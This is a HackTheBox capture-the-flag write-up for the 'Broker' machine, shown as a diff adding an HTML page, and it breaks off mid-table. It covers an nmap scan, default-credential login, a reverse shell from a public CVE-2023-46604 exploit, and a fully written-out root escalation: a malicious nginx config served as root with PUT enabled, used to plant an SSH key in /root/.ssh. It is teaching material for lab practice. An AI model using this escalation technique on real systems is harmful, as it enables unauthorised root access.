@@ -1,0 +1,1076 @@
+
+  
+    
+    <title>
+      HackTheBox - Broker (Easy)
+    </title>
+    
+  
+  
+    
+      <header>
+<div class="header"><img src="https://www.notion.so/images/page-cover/gradients_3.png" class="headerImage"/>
+<img class="headerIcon" src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/icon.png"/>
+<h1 class="mainTitle">
+          HackTheBox - Broker (Easy)
+        </h1 class="mainTitle">
+</div></header>
+      <div class="writeUp">
+        <h1 id="bf3ac0f4-45c5-4470-9548-6e5c591a9d3c">
+          Table of contents
+        </h1>
+        <nav id="fd0cb885-2ff1-4a2d-8989-76f9cad1cc1e">
+          <div>
+            <a href="#bf3ac0f4-45c5-4470-9548-6e5c591a9d3c">
+              Table of contents
+            </a>
+          </div>
+          <div>
+            <a href="#31ab5335-c2aa-4284-84bf-c738b5eacb9a">
+              Enumeration
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#376930ba-5f4e-4251-a487-f3b8f1e02439">
+              
+                Nmap scan
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#8ecb5d5d-49ef-4bfa-bbb7-023a9ce45364">
+              
+                Web enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#854881fc-c6bc-4eae-8c64-77cb0953b835">
+              Initial access
+            </a>
+          </div>
+          <div>
+            <a href="#fa86116e-b7c3-4555-97ea-dbfe2f1c6274">
+              
+              Post-exploitation
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#e1da507b-7969-4343-9d56-122d5fe254a1">
+              
+                Local enumeration
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#88500530-bc12-4cf3-9951-b47cb25dd104">
+              
+                Privilege escalation (root)
+              
+            </a>
+          </div>
+          <div>
+            <a href="#9206107c-cf61-408a-a247-4a3d804fb2f3">
+              Clearing tracks
+            </a>
+          </div>
+          <div>
+            <a href="#451c2f02-b9a8-420c-89e6-5d87f601ff12">
+              Vulnerabilities summary
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#47f81e22-ca16-4e01-a69b-3479e2444238">
+              
+                Default credentials
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#269a4019-96df-4176-be70-a1cb29d961f4">
+              
+                Remote Code Execution
+              
+            </a>
+          </div>
+          <div>
+            <a class="t2" href="#d75201c8-5d41-4b90-81d1-ff1a3c788838">
+              
+                Sudo permissions misconfiguration
+              
+            </a>
+          </div>
+          <div>
+            <a href="#0281ce21-801c-4ee7-87e8-fdc848d4f34e">
+              Tools used
+            </a>
+          </div>
+          <div>
+            <a href="#9cab1501-a2ec-43c1-a852-fe121492f71a">
+              Sources
+            </a>
+          </div>
+        </nav>
+        <h1 id="31ab5335-c2aa-4284-84bf-c738b5eacb9a">
+          Enumeration
+        </h1>
+        <h2 id="376930ba-5f4e-4251-a487-f3b8f1e02439">
+          
+            Nmap scan
+          
+        </h2>
+        
+        
+        
+<pre id="91020525-a67a-40bc-9c4f-ae32bb0a116b" class="code"><code># Nmap 7.93 scan initiated Mon Dec 11 10:50:50 2023 as: nmap -A -p- -T5 -oN nmapResults.txt -v 10.129.89.254
+Nmap scan report for 10.129.89.254
+Host is up (0.025s latency).
+Not shown: 65526 closed tcp ports (conn-refused)
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 3eea454bc5d16d6fe2d4d13b0a3da94f (ECDSA)
+|_  256 64cc75de4ae6a5b473eb3f1bcfb4e394 (ED25519)
+80/tcp    open  http       nginx 1.18.0 (Ubuntu)
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-title: Error 401 Unauthorized
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+1883/tcp  open  mqtt
+| mqtt-subscribe: 
+|   Topics and their most recent payloads: 
+|     ActiveMQ/Advisory/MasterBroker: 
+|_    ActiveMQ/Advisory/Consumer/Topic/#: 
+5672/tcp  open  amqp?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, GetRequest, HTTPOptions, RPCCheck, RTSPRequest, SSLSessionReq, TerminalServerCookie: 
+|     AMQP
+|     AMQP
+|     amqp:decode-error
+|_    7Connection from client using unsupported AMQP attempted
+|_amqp-info: ERROR: AQMP:handshake expected header (1) frame, but was 65
+8161/tcp  open  http       Jetty 9.4.39.v20210325
+| http-auth: 
+| HTTP/1.1 401 Unauthorized\x0D
+|_  basic realm=ActiveMQRealm
+|_http-title: Error 401 Unauthorized
+|_http-server-header: Jetty(9.4.39.v20210325)
+34339/tcp open  tcpwrapped
+61613/tcp open  stomp      Apache ActiveMQ
+| fingerprint-strings: 
+|   HELP4STOMP: 
+|     ERROR
+|     content-type:text/plain
+|     message:Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolException: Unknown STOMP action: HELP
+|     org.apache.activemq.transport.stomp.ProtocolConverter.onStompCommand(ProtocolConverter.java:258)
+|     org.apache.activemq.transport.stomp.StompTransportFilter.onCommand(StompTransportFilter.java:85)
+|     org.apache.activemq.transport.TransportSupport.doConsume(TransportSupport.java:83)
+|     org.apache.activemq.transport.tcp.TcpTransport.doRun(TcpTransport.java:233)
+|     org.apache.activemq.transport.tcp.TcpTransport.run(TcpTransport.java:215)
+|_    java.lang.Thread.run(Thread.java:750)
+61614/tcp open  http       Jetty 9.4.39.v20210325
+| http-methods: 
+|   Supported Methods: GET HEAD TRACE OPTIONS
+|_  Potentially risky methods: TRACE
+|_http-title: Site doesn&#x27;t have a title.
+|_http-favicon: Unknown favicon MD5: D41D8CD98F00B204E9800998ECF8427E
+|_http-server-header: Jetty(9.4.39.v20210325)
+61616/tcp open  apachemq   ActiveMQ OpenWire transport
+| fingerprint-strings: 
+|   NULL: 
+|     ActiveMQ
+|     TcpNoDelayEnabled
+|     SizePrefixDisabled
+|     CacheSize
+|     ProviderName 
+|     ActiveMQ
+|     StackTraceEnabled
+|     PlatformDetails 
+|     Java
+|     CacheEnabled
+|     TightEncodingEnabled
+|     MaxFrameSize
+|     MaxInactivityDuration
+|     MaxInactivityDurationInitalDelay
+|     ProviderVersion 
+|_    5.15.15
+3 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port5672-TCP:V=7.93%I=7%D=12/11%Time=6576DB8F%P=x86_64-pc-linux-gnu%r(G
+SF:etRequest,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10
+SF:\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x0
+SF:1\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20cl
+SF:ient\x20using\x20unsupported\x20AMQP\x20attempted&quot;)%r(HTTPOptions,89,&quot;A
+SF:MQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa
+SF:1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x
+SF:02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20using\x
+SF:20unsupported\x20AMQP\x20attempted&quot;)%r(RTSPRequest,89,&quot;AMQP\x03\x01\0\0
+SF:AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0
+SF:`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:
+SF:decode-error\xa17Connection\x20from\x20client\x20using\x20unsupported\x
+SF:20AMQP\x20attempted&quot;)%r(RPCCheck,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0
+SF:\0\x19\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x
+SF:02\0\0\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17C
+SF:onnection\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempte
+SF:d&quot;)%r(DNSVersionBindReqTCP,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19
+SF:\x02\0\0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0
+SF:\0\0S\x18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connect
+SF:ion\x20from\x20client\x20using\x20unsupported\x20AMQP\x20attempted&quot;)%r(
+SF:DNSStatusRequestTCP,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\
+SF:0\0\0S\x10\xc0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x
+SF:18\xc0S\x01\0S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20
+SF:from\x20client\x20using\x20unsupported\x20AMQP\x20attempted&quot;)%r(SSLSess
+SF:ionReq,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc
+SF:0\x0c\x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0
+SF:S\x1d\xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20clien
+SF:t\x20using\x20unsupported\x20AMQP\x20attempted&quot;)%r(TerminalServerCookie
+SF:,89,&quot;AMQP\x03\x01\0\0AMQP\0\x01\0\0\0\0\0\x19\x02\0\0\0\0S\x10\xc0\x0c\
+SF:x04\xa1\0@p\0\x02\0\0`\x7f\xff\0\0\0`\x02\0\0\0\0S\x18\xc0S\x01\0S\x1d\
+SF:xc0M\x02\xa3\x11amqp:decode-error\xa17Connection\x20from\x20client\x20u
+SF:sing\x20unsupported\x20AMQP\x20attempted&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port61613-TCP:V=7.93%I=7%D=12/11%Time=6576DB8A%P=x86_64-pc-linux-gnu%r(
+SF:HELP4STOMP,27F,&quot;ERROR\ncontent-type:text/plain\nmessage:Unknown\x20STOM
+SF:P\x20action:\x20HELP\n\norg\.apache\.activemq\.transport\.stomp\.Protoc
+SF:olException:\x20Unknown\x20STOMP\x20action:\x20HELP\n\tat\x20org\.apach
+SF:e\.activemq\.transport\.stomp\.ProtocolConverter\.onStompCommand\(Proto
+SF:colConverter\.java:258\)\n\tat\x20org\.apache\.activemq\.transport\.sto
+SF:mp\.StompTransportFilter\.onCommand\(StompTransportFilter\.java:85\)\n\
+SF:tat\x20org\.apache\.activemq\.transport\.TransportSupport\.doConsume\(T
+SF:ransportSupport\.java:83\)\n\tat\x20org\.apache\.activemq\.transport\.t
+SF:cp\.TcpTransport\.doRun\(TcpTransport\.java:233\)\n\tat\x20org\.apache\
+SF:.activemq\.transport\.tcp\.TcpTransport\.run\(TcpTransport\.java:215\)\
+SF:n\tat\x20java\.lang\.Thread\.run\(Thread\.java:750\)\n\0\n&quot;);
+==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
+SF-Port61616-TCP:V=7.93%I=7%D=12/11%Time=6576DB8A%P=x86_64-pc-linux-gnu%r(
+SF:NULL,140,&quot;\0\0\x01&lt;\x01ActiveMQ\0\0\0\x0c\x01\0\0\x01\*\0\0\0\x0c\0\x11
+SF:TcpNoDelayEnabled\x01\x01\0\x12SizePrefixDisabled\x01\0\0\tCacheSize\x0
+SF:5\0\0\x04\0\0\x0cProviderName\t\0\x08ActiveMQ\0\x11StackTraceEnabled\x0
+SF:1\x01\0\x0fPlatformDetails\t\0\x04Java\0\x0cCacheEnabled\x01\x01\0\x14T
+SF:ightEncodingEnabled\x01\x01\0\x0cMaxFrameSize\x06\0\0\0\0\x06@\0\0\0\x1
+SF:5MaxInactivityDuration\x06\0\0\0\0\0\0u0\0\x20MaxInactivityDurationInit
+SF:alDelay\x06\0\0\0\0\0\0&#x27;\x10\0\x0fProviderVersion\t\0\x075\.15\.15&quot;);
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Mon Dec 11 10:51:33 2023 -- 1 IP address (1 host up) scanned in 43.62 seconds</code></pre>
+        <h2 id="8ecb5d5d-49ef-4bfa-bbb7-023a9ce45364">
+          
+            Web enumeration
+          
+        </h2>
+        <p id="4d5272e4-9903-4470-911b-af99bddd2e89">
+          Let’s see what’s on port 80 using our web browser : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled.png"/>
+          </a>
+        
+        <p id="ec019dfa-258c-4645-8085-c8471862c1f2">
+          We are asked for credentials. If we try admin as username and password, we are successfully logged in and we are redirected to this web page : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%201.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%201.png"/>
+          </a>
+        
+        <p id="dd8bbd29-88a5-4ab9-aa42-bc1f9ec20c8c">
+          If we click on 
+          
+            Manage ActiveMQ Broker
+          
+          , we are redirected to this web page :
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%202.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%202.png"/>
+          </a>
+        
+        <p id="316dfdc9-276a-4cd2-9461-deb6462254b5">
+          We can see that 
+          
+            ActiveMQ 5.15.15
+          
+           is running on this web server. Let’s see if this version is vulnerable by searching for it on the NIST website : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%203.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%203.png"/>
+          </a>
+        
+        <p id="38b8a32e-971e-440c-95b3-6256c98ee760">
+          Let’s try to exploit 
+          
+            CVE-2023-46604
+          
+           in order to execute arbitrary code to get a shell on the target system.
+        </p>
+        <h1 id="854881fc-c6bc-4eae-8c64-77cb0953b835">
+          Initial access
+        </h1>
+        <p id="2120c1b4-4dca-4dee-b69d-e1837bcb2c83">
+          There is an exploit available for this vulnerability on GitHub 
+          <a href="https://github.com/evkl1d/CVE-2023-46604">
+            here
+          </a>
+           : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%204.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%204.png"/>
+          </a>
+        
+        <p id="d5ebb9d5-d0d0-4d93-92f4-635233ad882d">
+          We can clone this repository on our attacking host :
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%205.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%205.png"/>
+          </a>
+        
+        <p id="aae9a5c9-394d-495f-94da-03d8753a0a61">
+          Now, we can edit the poc.xml file to change the IP address and port that will receive the reverse shell : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%206.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%206.png"/>
+          </a>
+        
+        <p id="b80af4a5-b131-49e7-bee1-b90bfbcf4476">
+          We need to start a web server in the same directory as poc.xml like so : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%207.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%207.png"/>
+          </a>
+        
+        <p id="ce725e47-05e6-4b35-aa91-ba13e559088f">
+          Next, we can start a listener in order to receive the reverse shell : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%208.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%208.png"/>
+          </a>
+        
+        <p id="2f2836ce-1f9d-4222-9666-b205e8b37f38">
+          Finally, we can run the exploit :
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%209.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%209.png"/>
+          </a>
+        
+        <p id="f67338b0-b6f7-4d43-bdbd-fb7cd7fe4a3b">
+          And we should receive a reverse shell on our listener :
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%2010.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%2010.png"/>
+          </a>
+        
+        <h1 id="fa86116e-b7c3-4555-97ea-dbfe2f1c6274">
+          
+          Post-exploitation
+          
+        </h1>
+        <h2 id="e1da507b-7969-4343-9d56-122d5fe254a1">
+          
+            Local enumeration
+          
+        </h2>
+        <p id="e18a4ded-1a34-414a-bfd5-d21161e2d20f">
+          Let’s take a look at our sudo rights : 
+        </p>
+        
+          <a href="HackTheBox%20-%20Broker%20(Easy)%2041b7cf7151c3400fabe7892f9ad5b8d5/Untitled%2011.png">
+            <img src="https://raw.githubusercontent.com/Cyberretta/Write-Ups-HTB/main/Easy/Broker/Untitled%2011.png"/>
+          </a>
+        
+        <p id="4fcca6e6-fbcb-4a24-865c-b69014ac66bf">
+          We can run nginx as root without password. In order to exploit this we will need to :
+        </p>
+        <ul id="4305cc76-836f-46aa-b04e-9c2cd8071fd9">
+          <li>
+            Create a custom nginx configuration file
+          </li>
+        </ul>
+        <ul id="4c22a782-ff93-4a00-8134-afbac6a59c28">
+          <li>
+            Change nginx PID to avoid conflict
+          </li>
+        </ul>
+        <ul id="884325d5-204d-4e22-9972-cacc6e769b0c">
+          <li>
+            Make it run as root
+          </li>
+        </ul>
+        <ul id="2649fe6e-d388-405e-8af2-a1bc641fef44">
+          <li>
+            Make it run on another port (any available port should work)
+          </li>
+        </ul>
+        <ul id="de0e60d3-8dfc-4ef7-8c44-040993a6d0e9">
+          <li>
+            Make the PUT method available
+          </li>
+        </ul>
+        <ul id="197d5631-1314-4528-9725-e90840a844ff">
+          <li>
+            Define the website root to 
+            <code>
+              /root
+            </code>
+          </li>
+        </ul>
+        <h2 id="88500530-bc12-4cf3-9951-b47cb25dd104">
+          
+            Privilege escalation (root)
+          
+        </h2>
+        <p id="6cbc872e-1f20-48d3-8c19-163c57094671">
+          With this configuration, we should be able to upload an SSH public key in 
+          <code>
+            /root/.ssh
+          </code>
+           in order to log in via SSH as root on the target server. We can copy the default nginx configuration files like so : 
+        </p>
+        
+        
+        
+<pre id="e9ec21ac-9b88-43b3-a600-a6b09aae10f6" class="code"><code>(remote) activemq@broker:/home/activemq$ cp /etc/nginx/nginx.conf ./
+(remote) activemq@broker:/home/activemq$ cp /etc/nginx/sites-enabled/default ./
+(remote) activemq@broker:/home/activemq$ ls
+default  nginx.conf  user.txt</code></pre>
+        <p id="3a6d0f0f-d399-48be-8ec3-bb8e1bd353a1">
+          Now, we can edit the 
+          <code>
+            nginx.conf
+          </code>
+           file like so : 
+        </p>
+        
+        
+        
+<pre id="08764db1-e1ff-46ad-a31c-235482bcb7a9" class="code"><code>(remote) activemq@broker:/home/activemq$ cat nginx.conf 
+user root;
+worker_processes auto;
+pid /run/nginx2.pid;
+include /etc/nginx/modules-enabled/*.conf;
+
+events {
+	worker_connections 768;
+	# multi_accept on;
+}
+
+http {
+
+	##
+	# Basic Settings
+	##
+
+	sendfile on;
+	tcp_nopush on;
+	types_hash_max_size 2048;
+	# server_tokens off;
+
+	# server_names_hash_bucket_size 64;
+	# server_name_in_redirect off;
+
+	include /etc/nginx/mime.types;
+	default_type application/octet-stream;
+
+	##
+	# SSL Settings
+	##
+
+	ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE
+	ssl_prefer_server_ciphers on;
+
+	##
+	# Logging Settings
+	##
+
+	access_log /var/log/nginx/access.log;
+	error_log /var/log/nginx/error.log;
+
+	##
+	# Gzip Settings
+	##
+
+	gzip on;
+
+	##
+	# Virtual Host Configs
+	##
+
+	include /etc/nginx/conf.d/*.conf;
+	include /home/activemq/default;
+}</code></pre>
+        <p id="3dad7d98-218d-4774-bc67-4560d5c40603">
+          And the 
+          <code>
+            default
+          </code>
+           virtual host configuration file like so : 
+        </p>
+        
+        
+        
+<pre id="f159ef65-9e58-4bfe-831b-46f532a7c3a6" class="code"><code>(remote) activemq@broker:/home/activemq$ cat default 
+server {
+    listen 1234;
+    server_name  privesc.local;
+    root /root;
+    dav_methods PUT;
+}</code></pre>
+        <p id="b9d353c8-d8f2-49bb-91e7-58568fa0d4fc">
+          Now, we can run nginx with the custom configuration like so : 
+        </p>
+        
+        
+        
+<pre id="aed6081a-d588-401a-bdce-b56cfe2b8e64" class="code"><code>(remote) activemq@broker:/home/activemq$ sudo nginx -c /home/activemq/nginx.conf</code></pre>
+        <p id="a41936ab-18c3-4622-af83-6bf198dffbd6">
+          Then, we can generate a pair of SSH keys :
+        </p>
+        
+        
+        
+<pre id="a0201a94-5afa-4264-9de6-e3b8d68bc852" class="code"><code>┌─[cyberretta@parrot]─[~/Documents/HTB/Machines/Easy/Broker/exploits]
+└──╼ $ssh-keygen -f id_rsa
+Generating public/private rsa key pair.
+Enter passphrase (empty for no passphrase): 
+Enter same passphrase again: 
+Your identification has been saved in id_rsa
+Your public key has been saved in id_rsa.pub
+The key fingerprint is:
+SHA256:ZT1vUahh3hyjQvG+BF2lmBtETUUf7vWGlYjwyFS+Ncw cyberretta@parrot
+The key&#x27;s randomart image is:
++---[RSA 3072]----+
+|         oo+ooo*=|
+|        o *=*+Bo+|
+|         ++*OEo=+|
+|         o.o*==+o|
+|        S  o+ +.o|
+|           . o . |
+|            .    |
+|                 |
+|                 |
++----[SHA256]-----+</code></pre>
+        <p id="05c3f8fa-cbb2-4892-be9e-1a6bb878efc9">
+          Next, we need to rename the 
+          <code>
+            id_rsa.pub
+          </code>
+           file to 
+          <code>
+            authorized_keys
+          </code>
+           : 
+        </p>
+        
+        
+        
+<pre id="baec71e1-23dc-41d5-a9a1-4cf75e458c29" class="code"><code>┌─[cyberretta@parrot]─[~/Documents/HTB/Machines/Easy/Broker/exploits]
+└──╼ $mv id_rsa.pub authorized_keys</code></pre>
+        <p id="42d9d55d-f46e-4bf4-a6a0-de0830321877">
+          After this, we can upload the public SSH key with curl :
+        </p>
+        
+        
+        
+<pre id="227d579c-3b3d-4961-b3c4-eed4527eed68" class="code"><code>┌─[cyberretta@parrot]─[~/Documents/HTB/Machines/Easy/Broker/exploits]
+└──╼ $curl -X PUT http://10.129.44.199:1234/.ssh/ --upload-file authorized_keys</code></pre>
+        <p id="5f69ee01-bc73-46c4-a8cf-4ca2430af96d">
+          Finally, we should be able to use our private SSH key to login as root on SSH : 
+        </p>
+        
+        
+        
+<pre id="cf78bcc1-7294-4229-b211-fd7b74f16d44" class="code"><code>┌─[cyberretta@parrot]─[~/Documents/HTB/Machines/Easy/Broker/exploits]
+└──╼ $ssh root@10.129.44.199 -i id_rsa 
+The authenticity of host &#x27;10.129.44.199 (10.129.44.199)&#x27; can&#x27;t be established.
+ECDSA key fingerprint is SHA256:/GPlBWttNcxd3ra0zTlmXrcsc1JM6jwKYH5Bo5qE5DM.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added &#x27;10.129.44.199&#x27; (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Tue Dec 12 03:52:15 PM UTC 2023
+
+  System load:           0.0
+  Usage of /:            70.5% of 4.63GB
+  Memory usage:          10%
+  Swap usage:            0%
+  Processes:             159
+  Users logged in:       0
+  IPv4 address for eth0: 10.129.44.199
+  IPv6 address for eth0: dead:beef::250:56ff:fe96:97f6
+
+ * Strictly confined Kubernetes makes edge and IoT secure. Learn how MicroK8s
+   just raised the bar for easy, resilient and secure K8s cluster deployment.
+
+   https://ubuntu.com/engage/secure-kubernetes-at-the-edge
+
+Expanded Security Maintenance for Applications is not enabled.
+
+0 updates can be applied immediately.
+
+Enable ESM Apps to receive additional future security updates.
+See https://ubuntu.com/esm or run: sudo pro status
+
+
+The list of available updates is more than a week old.
+To check for new updates run: sudo apt update
+
+root@broker:~#</code></pre>
+        <p id="e59112ed-d6f4-455d-832b-4d613b938297">
+          We are now root on the target system.
+        </p>
+        <h1 id="9206107c-cf61-408a-a247-4a3d804fb2f3">
+          Clearing tracks
+        </h1>
+        <ul id="5b22d53b-1c5f-483f-9e4c-7beae8b91064">
+          <li>
+            Remove malicious nginx config files
+          </li>
+        </ul>
+        <ul id="866b4896-e41b-455a-8b02-59244eaae2d7">
+          <li>
+            Kill malicious nginx process
+          </li>
+        </ul>
+        <ul id="c2679e7e-bd6e-4f3d-9ef0-66cb647eee09">
+          <li>
+            Remove attacker SSH public key from 
+            <code>
+              /root/.ssh
+            </code>
+            .
+          </li>
+        </ul>
+        <h1 id="451c2f02-b9a8-420c-89e6-5d87f601ff12">
+          Vulnerabilities summary
+        </h1>
+        <h2 id="47f81e22-ca16-4e01-a69b-3479e2444238">
+          
+            Default credentials
+          
+        </h2>
+        <table id="5f4a7e3f-b926-4c1a-9883-41c409b7c79a">
+          <thead>
+            <tr id="5ffd0a6b-72b6-4706-952e-afddeca3c768">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="aa669a18-9a56-47e5-8395-767c2e480255">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Apache ActiveMQ service
+              </td>
+            </tr>
+            <tr id="9ee27bff-48ff-41e1-bb0a-f1dc9d937c5e">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  7.3
+                
+              </td>
+            </tr>
+            <tr id="0c71ad7a-6d54-4ffb-b0aa-a17bf4908136">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  HIGH
+                
+              </td>
+            </tr>
+            <tr id="4d93fec7-1db9-4f74-a5e6-9b5d9b332f35">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
+            <tr id="55159b64-263b-4d47-a49d-9db93905890c">
+              <td id="&lt;?AB">
+                Impact
+              </td>
+              <td id="BY@B">
+                Allows an attacker to gain full access to the 
+                
+                  Apache ActiveMQ
+                
+                 web service.
+                
+                  
+                  
+                
+                
+                This has a 
+                
+                
+                  
+                    low
+                  
+                
+                 impact on the 
+                
+                  
+                    integrity
+                  
+                
+                
+                  , 
+                
+                
+                  
+                    confidentiality
+                  
+                
+                
+                   and 
+                
+                
+                  
+                    availability 
+                  
+                
+                of the affected component.
+              </td>
+            </tr>
+            <tr id="fd08f418-c8a0-4257-96e1-280d6050c482">
+              <td id="&lt;?AB">
+                Remediation proposition
+              </td>
+              <td id="BY@B">
+                Change default credentials and use a strong password.
+              </td>
+            </tr>
+          </tbody>
+        </table>
+        <h2 id="269a4019-96df-4176-be70-a1cb29d961f4">
+          
+            Remote Code Execution
+          
+        </h2>
+        <table id="c668ca7f-aa3b-4550-8b26-3e160f6e314d">
+          <thead>
+            <tr id="93137381-0fe8-46d0-8f09-69d0e3c3582d">
+              <th id="&lt;?AB">
+                Field
+              </th>
+              <th id="BY@B">
+                Value
+              </th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr id="e018d7b5-b7e5-40cf-8ba1-1b17ed7ab2b6">
+              <td id="&lt;?AB">
+                Affected component
+              </td>
+              <td id="BY@B">
+                Apache ActiveMQ service
+              </td>
+            </tr>
+            <tr id="4de4b933-21e9-4560-adc9-335912a63f6d">
+              <td id="&lt;?AB">
+                CVSS 3.0 score
+              </td>
+              <td id="BY@B">
+                
+                  9.8
+                
+              </td>
+            </tr>
+            <tr id="a1eb078a-c84c-4f51-ab2a-3df35de08bd5">
+              <td id="&lt;?AB">
+                Severity
+              </td>
+              <td id="BY@B">
+                
+                  
+                    CRITICAL
+                  
+                
+              </td>
+            </tr>
+            <tr id="b3f957d1-40f2-4a88-97d7-594b3131c77a">
+              <td id="&lt;?AB">
+                Attack vector
+              </td>
+              <td id="BY@B">
+                
+                  Network
+                
+              </td>
+            </tr>
